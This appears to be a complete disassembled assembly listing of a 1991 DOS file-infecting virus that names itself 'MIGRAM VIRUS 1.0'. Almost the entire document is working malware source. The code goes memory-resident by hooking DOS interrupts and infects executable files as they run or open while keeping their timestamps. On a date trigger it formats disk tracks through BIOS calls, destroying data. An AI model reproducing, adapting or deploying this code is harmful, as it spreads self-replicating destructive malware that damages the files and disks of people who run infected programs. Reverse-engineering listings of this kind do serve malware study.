PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                             MIGRAM                                   ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ      Created:   2-Jan-80                                             ÛÛ
;ÛÛ      Version:                                                        ÛÛ
;ÛÛ      Passes:    5          Analysis Options on: H                    ÛÛ
;ÛÛ      (C) 1991 IVL                                                    ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e         equ     4Ch                     ; (0000:004C=0D0h)
data_3e         equ     84h                     ; (0000:0084=0C7h)
data_5e         equ     90h                     ; (0000:0090=0BFh)
data_7e         equ     102h                    ; (0000:0102=0F000h)
data_8e         equ     106h                    ; (0000:0106=0F000h)
data_9e         equ     47Bh                    ; (0000:047B=14h)
data_10e        equ     0                       ; (0676:0000=0E8h)
data_11e        equ     1                       ; (0677:0001=3EC4h)
data_12e        equ     2                       ; (06C7:0002=0B8C3h)
data_13e        equ     6                       ; (06C7:0006=0F0EBh)
data_35e        equ     0FCB6h                  ; (7382:FCB6=0)
data_36e        equ     0FCB8h                  ; (7382:FCB8=0)
data_37e        equ     0FCD4h                  ; (7382:FCD4=0)
data_38e        equ     0FCD6h                  ; (7382:FCD6=0)
data_39e        equ     0FCD8h                  ; (7382:FCD8=0)
data_40e        equ     0FCE2h                  ; (7382:FCE2=0)
data_41e        equ     0FCE4h                  ; (7382:FCE4=0)
data_42e        equ     0FCEAh                  ; (7382:FCEA=0)
data_43e        equ     0FCECh                  ; (7382:FCEC=0)
data_44e        equ     0                       ; (F000:0000=0AA55h)
data_45e        equ     2                       ; (F000:0002=40h)

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h

migram          proc    far

start:
                jmp     loc_22                  ; (0449)
                db      0C3h
                db      23 dup (0C3h)
                db      2Ah, 2Eh, 5Ah, 49h, 50h, 0
data_17         dw      0C3C3h
data_18         dw      0C3C3h
data_19         db      0, 0
data_20         dw      0
data_21         dw      0
data_22         dw      0
data_23         dw      7382h
data_24         dd      00000h
data_25         dw      0
data_26         dw      7382h
data_27         dd      00000h
data_28         dw      0
data_29         dw      7382h
data_30         db      0Ah, 0Dh, ' ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ'
                db      '»', 0Ah, 0Dh, ' º  MIGRAM VIRUS '
                db      '1.0  º', 0Ah, 0Dh, ' º    (C) 19'
                db      '91 IVL    º', 0Ah, 0Dh, ' ÈÍÍÍÍÍ'
                db      'ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼', 0Ah, 0Dh, 0Ah
                db      0Dh, '$'
                db      3Dh, 4Dh, 4Bh, 75h, 9, 55h
                db      8Bh, 0ECh, 83h, 66h, 6, 0FEh
                db      5Dh, 0CFh, 80h, 0FCh, 4Bh, 74h
                db      12h, 3Dh, 0, 3Dh, 74h, 0Dh
                db      3Dh, 0, 6Ch, 75h, 5, 80h
                db      0FBh, 0, 74h, 3
loc_1:
                jmp     loc_13                  ; (0277)
loc_2:
                push    es
                push    ds
                push    di
                push    si
                push    bp
                push    dx
                push    cx
                push    bx
                push    ax
                call    sub_6                   ; (03CF)
                call    sub_7                   ; (040C)
                cmp     ax,6C00h
                jne     loc_3                   ; Jump if not equal
                mov     dx,si
loc_3:
                mov     cx,80h
                mov     si,dx

locloop_4:
                inc     si
                mov     al,[si]
                or      al,al                   ; Zero ?
                loopnz  locloop_4               ; Loop if zf=0, cx>0

                sub     si,2
                cmp     word ptr [si],5049h
                je      loc_7                   ; Jump if equal
                cmp     word ptr [si],4558h
                je      loc_6                   ; Jump if equal
loc_5:
                jmp     short loc_12            ; (026B)
                db      90h
loc_6:
                cmp     word ptr [si-2],452Eh
                je      loc_8                   ; Jump if equal
                jmp     short loc_5             ; (01FE)
loc_7:
                cmp     word ptr [si-2],5A2Eh
                jne     loc_5                   ; Jump if not equal
loc_8:
                mov     ax,3D02h
                call    sub_5                   ; (03C8)
                jc      loc_12                  ; Jump if carry Set
                mov     bx,ax
                mov     ax,5700h
                call    sub_5                   ; (03C8)
                mov     cs:data_20,cx           ; (7382:0127=0)
                mov     cs:data_21,dx           ; (7382:0129=0)
                mov     ax,4200h
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                call    sub_5                   ; (03C8)
                push    cs
                pop     ds
                mov     dx,103h
                mov     si,dx
                mov     cx,18h
                mov     ah,3Fh                  ; '?'
                call    sub_5                   ; (03C8)
                jc      loc_10                  ; Jump if carry Set
                cmp     word ptr [si],5A4Dh
                jne     loc_9                   ; Jump if not equal
                call    sub_1                   ; (027C)
                jmp     short loc_10            ; (0254)
loc_9:
                call    sub_4                   ; (03AA)
loc_10:
                jc      loc_11                  ; Jump if carry Set
                mov     ax,5701h
                mov     cx,cs:data_20           ; (7382:0127=0)
                mov     dx,cs:data_21           ; (7382:0129=0)
                call    sub_5                   ; (03C8)
loc_11:
                mov     ah,3Eh                  ; '>'
                call    sub_5                   ; (03C8)
loc_12:
                call    sub_7                   ; (040C)
                pop     ax
                pop     bx
                pop     cx
                pop     dx
                pop     bp
                pop     si
                pop     di
                pop     ds
                pop     es
loc_13:
                jmp     cs:data_24              ; (7382:012F=0)

migram          endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1           proc    near
                mov     ah,2Ah                  ; '*'
                int     21h                     ; DOS Services  ah=function 2Ah
                                                ;  get date, cx=year, dx=mon/day
                cmp     al,6
                je      loc_15                  ; Jump if equal
                jnz     loc_14                  ; Jump if not zero
loc_14:
                mov     cx,[si+16h]
                add     cx,[si+8]
                mov     ax,10h
                mul     cx                      ; dx:ax = reg * ax
                add     ax,[si+14h]
                adc     dx,0
                push    dx
                push    ax
                mov     ax,4202h
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                call    sub_5                   ; (03C8)
                cmp     dx,0
                jne     loc_16                  ; Jump if not equal
                cmp     ax,4C3h
                jae     loc_16                  ; Jump if above or =
                pop     ax
                pop     dx
                stc                             ; Set carry flag
                retn
loc_15:
                mov     ah,5
                mov     ch,0
                mov     cl,0
                mov     dh,0
                mov     dl,2
                int     13h                     ; Disk  dl=drive #: ah=func c5h
                                                ;  format track=ch or cylindr=cx
                mov     ah,5
                mov     ch,0
                mov     cl,1
                mov     dh,0
                mov     dl,2
                int     13h                     ; Disk  dl=drive #: ah=func c5h
                                                ;  format track=ch or cylindr=cx
                mov     ah,5
                mov     ch,0
                mov     cl,2
                mov     dh,0
                mov     dl,2
                int     13h                     ; Disk  dl=drive #: ah=func c5h
                                                ;  format track=ch or cylindr=cx
                mov     ah,5
                mov     ch,0
                mov     cl,3
                mov     dh,0
                mov     dl,2
                int     13h                     ; Disk  dl=drive #: ah=func c5h
                                                ;  format track=ch or cylindr=cx
                mov     ah,5
                mov     ch,0
                mov     cl,4
                mov     dh,0
                mov     dl,2
                int     13h                     ; Disk  dl=drive #: ah=func c5h
                                                ;  format track=ch or cylindr=cx
                mov     ah,5
                mov     ch,0
                mov     cl,5
                mov     dh,0
                mov     dl,2
                int     13h                     ; Disk  dl=drive #: ah=func c5h
                                                ;  format track=ch or cylindr=cx
                mov     dx,offset data_30       ; (7382:013F=0Ah)
                mov     ah,9
                int     21h                     ; DOS Services  ah=function 09h
                                                ;  display char string at ds:dx
                call    sub_9                   ; (043A)
                int     20h                     ; Program Terminate
loc_16:
                mov     di,ax
                mov     bp,dx
                pop     cx
                sub     ax,cx
                pop     cx
                sbb     dx,cx
                cmp     word ptr [si+0Ch],0
                je      loc_ret_19              ; Jump if equal
                cmp     dx,0
                jne     loc_17                  ; Jump if not equal
                cmp     ax,4C3h
                jne     loc_17                  ; Jump if not equal
                stc                             ; Set carry flag
                retn
loc_17:
                mov     dx,bp
                mov     ax,di
                push    dx
                push    ax
                add     ax,4C3h
                adc     dx,0
                mov     cx,200h
                div     cx                      ; ax,dx rem=dx:ax/reg
                les     di,dword ptr [si+2]     ; Load 32 bit ptr
                mov     cs:data_22,di           ; (7382:012B=0)
                mov     cs:data_23,es           ; (7382:012D=7382h)
                mov     [si+2],dx
                cmp     dx,0
                je      loc_18                  ; Jump if equal
                inc     ax
loc_18:
                mov     [si+4],ax
                pop     ax
                pop     dx
                call    sub_2                   ; (038B)
                sub     ax,[si+8]
                les     di,dword ptr [si+14h]   ; Load 32 bit ptr
                mov     data_17,di              ; (7382:0121=0C3C3h)
                mov     data_18,es              ; (7382:0123=0C3C3h)
                mov     [si+14h],dx
                mov     [si+16h],ax
                mov     word ptr data_19,ax     ; (7382:0125=0)
                mov     ax,4202h
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                call    sub_5                   ; (03C8)
                call    sub_3                   ; (039C)
                jc      loc_ret_19              ; Jump if carry Set
                mov     ax,4200h
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                call    sub_5                   ; (03C8)
                mov     ah,40h                  ; '@'
                mov     dx,si
                mov     cx,18h
                call    sub_5                   ; (03C8)

loc_ret_19:
                retn
sub_1           endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_2           proc    near
                mov     cx,4
                mov     di,ax
                and     di,0Fh

locloop_20:
                shr     dx,1                    ; Shift w/zeros fill
                rcr     ax,1                    ; Rotate thru carry
                loop    locloop_20              ; Loop if cx > 0

                mov     dx,di
                retn
sub_2           endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_3           proc    near
                mov     ah,40h                  ; '@'
                mov     cx,4C3h
                mov     dx,100h
                call    sub_6                   ; (03CF)
                jmp     short loc_21            ; (03C8)
                db      90h

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_4:
                mov     dx,10h
                mov     ah,1Ah
                int     21h                     ; DOS Services  ah=function 1Ah
                                                ;  set DTA to ds:dx
                mov     dx,11Bh
                mov     cx,110Bh
                mov     ah,4Eh                  ; 'N'
                int     21h                     ; DOS Services  ah=function 4Eh
                                                ;  find 1st filenam match @ds:dx
                mov     dx,2Eh
                mov     ax,3D02h
                int     21h                     ; DOS Services  ah=function 3Dh
                                                ;  open file, al=mode,name@ds:dx
                mov     ah,41h                  ; 'A'
                int     21h                     ; DOS Services  ah=function 41h
                                                ;  delete file, name @ ds:dx
                retn
sub_3           endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_5           proc    near
loc_21:
                pushf                           ; Push flags
                call    cs:data_24              ; (7382:012F=0)
                retn
sub_5           endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_6           proc    near
                push    ax
                push    ds
                push    es
                xor     ax,ax                   ; Zero register
                push    ax
                pop     ds
                cli                             ; Disable interrupts
                les     ax,dword ptr ds:data_5e ; (0000:0090=5BFh) Load 32 bit ptr
                mov     cs:data_25,ax           ; (7382:0133=0)
                mov     cs:data_26,es           ; (7382:0135=7382h)
                mov     ax,431h
                mov     ds:data_5e,ax           ; (0000:0090=5BFh)
                mov     word ptr ds:data_5e+2,cs        ; (0000:0092=0EA3h)
                les     ax,dword ptr ds:data_1e ; (0000:004C=20D0h) Load 32 bit ptr
                mov     cs:data_28,ax           ; (7382:013B=0)
                mov     cs:data_29,es           ; (7382:013D=7382h)
                les     ax,cs:data_27           ; (7382:0137=0) Load 32 bit ptr
                mov     ds:data_1e,ax           ; (0000:004C=20D0h)
                mov     word ptr ds:data_1e+2,es        ; (0000:004E=102Ch)
                sti                             ; Enable interrupts
                pop     es
                pop     ds
                pop     ax
                retn
sub_6           endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_7           proc    near
                push    ax
                push    ds
                push    es
                xor     ax,ax                   ; Zero register
                push    ax
                pop     ds
                cli                             ; Disable interrupts
                les     ax,dword ptr cs:data_25 ; (7382:0133=0) Load 32 bit ptr
                mov     ds:data_5e,ax           ; (0000:0090=5BFh)
                mov     word ptr ds:data_5e+2,es        ; (0000:0092=0EA3h)
                les     ax,dword ptr cs:data_28 ; (7382:013B=0) Load 32 bit ptr
                mov     ds:data_1e,ax           ; (0000:004C=20D0h)
                mov     word ptr ds:data_1e+2,es        ; (0000:004E=102Ch)
                sti                             ; Enable interrupts
                pop     es
                pop     ds
                pop     ax
                retn
sub_7           endp

                db      0B0h, 3, 0CFh

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_8           proc    near
                mov     dx,10h
                mul     dx                      ; dx:ax = reg * ax
                retn
sub_8           endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_9           proc    near
                xor     ax,ax                   ; Zero register
                xor     bx,bx                   ; Zero register
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                xor     si,si                   ; Zero register
                xor     di,di                   ; Zero register
                xor     bp,bp                   ; Zero register
                retn
sub_9           endp

loc_22:
                push    ds
                call    sub_10                  ; (044D)

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_10          proc    near
                mov     ax,4B4Dh
                int     21h                     ; DOS Services  ah=function 4Bh
                                                ;  run progm @ds:dx, parm @es:bx
                jc      loc_23                  ; Jump if carry Set
                jmp     loc_33                  ; (057D)
loc_23:
                pop     si
                push    si
                mov     di,si
                xor     ax,ax                   ; Zero register
                push    ax
                pop     ds
                les     ax,dword ptr ds:data_1e ; (0000:004C=20D0h) Load 32 bit ptr
                mov     cs:data_42e[si],ax      ; (7382:FCEA=0)
                mov     cs:data_43e[si],es      ; (7382:FCEC=0)
                les     bx,dword ptr ds:data_3e ; (0000:0084=6C7h) Load 32 bit ptr
                mov     cs:data_40e[di],bx      ; (7382:FCE2=0)
                mov     cs:data_41e[di],es      ; (7382:FCE4=0)
                mov     ax,ds:data_7e           ; (0000:0102=0F000h)
                cmp     ax,0F000h
                jne     loc_31                  ; Jump if not equal
                mov     dl,80h
                mov     ax,ds:data_8e           ; (0000:0106=0F000h)
                cmp     ax,0F000h
                je      loc_24                  ; Jump if equal
                cmp     ah,0C8h
                jb      loc_31                  ; Jump if below
                cmp     ah,0F4h
                jae     loc_31                  ; Jump if above or =
                test    al,7Fh
                jnz     loc_31                  ; Jump if not zero
                mov     ds,ax
                cmp     word ptr ds:data_44e,0AA55h     ; (F000:0000=0AA55h)
                jne     loc_31                  ; Jump if not equal
                mov     dl,ds:data_45e          ; (F000:0002=40h)
loc_24:
                mov     ds,ax
                xor     dh,dh                   ; Zero register
                mov     cl,9
                shl     dx,cl                   ; Shift w/zeros fill
                mov     cx,dx
                xor     si,si                   ; Zero register

locloop_25:
                lodsw                           ; String [si] to ax
                cmp     ax,0FA80h
                jne     loc_26                  ; Jump if not equal
                lodsw                           ; String [si] to ax
                cmp     ax,7380h
                je      loc_27                  ; Jump if equal
                jnz     loc_28                  ; Jump if not zero
loc_26:
                cmp     ax,0C2F6h
                jne     loc_29                  ; Jump if not equal
                lodsw                           ; String [si] to ax
                cmp     ax,7580h
                jne     loc_28                  ; Jump if not equal
loc_27:
                inc     si
                lodsw                           ; String [si] to ax
                cmp     ax,40CDh
                je      loc_30                  ; Jump if equal
                sub     si,3
loc_28:
                dec     si
                dec     si
loc_29:
                dec     si
                loop    locloop_25              ; Loop if cx > 0

                jmp     short loc_31            ; (04EC)
loc_30:
                sub     si,7
                mov     cs:data_42e[di],si      ; (7382:FCEA=0)
                mov     cs:data_43e[di],ds      ; (7382:FCEC=0)
loc_31:
                mov     ah,62h                  ; 'b'
                int     21h                     ; DOS Services  ah=function 62h
                                                ;  get progrm seg prefix addr bx
                mov     es,bx
                mov     ah,49h                  ; 'I'
                int     21h                     ; DOS Services  ah=function 49h
                                                ;  release memory block, es=seg
                mov     bx,0FFFFh
                mov     ah,48h                  ; 'H'
                int     21h                     ; DOS Services  ah=function 48h
                                                ;  allocate memory, bx=bytes/16
                sub     bx,4Eh
                nop
                jc      loc_33                  ; Jump if carry Set
                mov     cx,es
                stc                             ; Set carry flag
                adc     cx,bx
                mov     ah,4Ah                  ; 'J'
                int     21h                     ; DOS Services  ah=function 4Ah
                                                ;  change mem allocation, bx=siz
                mov     bx,4Dh
                stc                             ; Set carry flag
                sbb     es:data_12e,bx          ; (06C7:0002=0B8C3h)
                push    es
                mov     es,cx
                mov     ah,4Ah                  ; 'J'
                int     21h                     ; DOS Services  ah=function 4Ah
                                                ;  change mem allocation, bx=siz
                mov     ax,es
                dec     ax
                mov     ds,ax
                mov     word ptr ds:data_11e,8  ; (0677:0001=3EC4h)
                call    sub_8                   ; (0434)
                mov     bx,ax
                mov     cx,dx
                pop     ds
                mov     ax,ds
                call    sub_8                   ; (0434)
                add     ax,ds:data_13e          ; (06C7:0006=0F0EBh)
                adc     dx,0
                sub     ax,bx
                sbb     dx,cx
                jc      loc_32                  ; Jump if carry Set
                sub     ds:data_13e,ax          ; (06C7:0006=0F0EBh)
loc_32:
                mov     si,di
                xor     di,di                   ; Zero register
                push    cs
                pop     ds
                sub     si,34Dh
                mov     cx,4C3h
                inc     cx
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                mov     ah,62h                  ; 'b'
                int     21h                     ; DOS Services  ah=function 62h
                                                ;  get progrm seg prefix addr bx
                dec     bx
                mov     ds,bx
                mov     byte ptr ds:data_10e,5Ah        ; (0676:0000=0E8h) 'Z'
                mov     dx,1A8h
                xor     ax,ax                   ; Zero register
                push    ax
                pop     ds
                mov     ax,es
                sub     ax,10h
                mov     es,ax
                cli                             ; Disable interrupts
                mov     ds:data_3e,dx           ; (0000:0084=6C7h)
                mov     word ptr ds:data_3e+2,es        ; (0000:0086=102Ch)
                sti                             ; Enable interrupts
                dec     byte ptr ds:data_9e     ; (0000:047B=14h)
loc_33:
                pop     si
                cmp     word ptr cs:data_35e[si],5A4Dh  ; (7382:FCB6=0)
                jne     loc_34                  ; Jump if not equal
                pop     ds
                mov     ax,cs:data_39e[si]      ; (7382:FCD8=0)
                mov     bx,cs:data_38e[si]      ; (7382:FCD6=0)
                push    cs
                pop     cx
                sub     cx,ax
                add     cx,bx
                push    cx
                push    word ptr cs:data_37e[si]        ; (7382:FCD4=0)
                push    ds
                pop     es
                call    sub_9                   ; (043A)
                retf                            ; Return far
loc_34:
                pop     ax
                mov     ax,cs:data_35e[si]      ; (7382:FCB6=0)
                mov     word ptr cs:[100h],ax   ; (7382:0100=46E9h)
                mov     ax,cs:data_36e[si]      ; (7382:FCB8=0)
                mov     word ptr cs:[102h],ax   ; (7382:0102=0C303h)
                mov     ax,100h
                push    ax
                push    cs
                pop     ds
                push    ds
                pop     es
                call    sub_9                   ; (043A)
                retn
sub_10          endp


seg_a           ends



                end     start
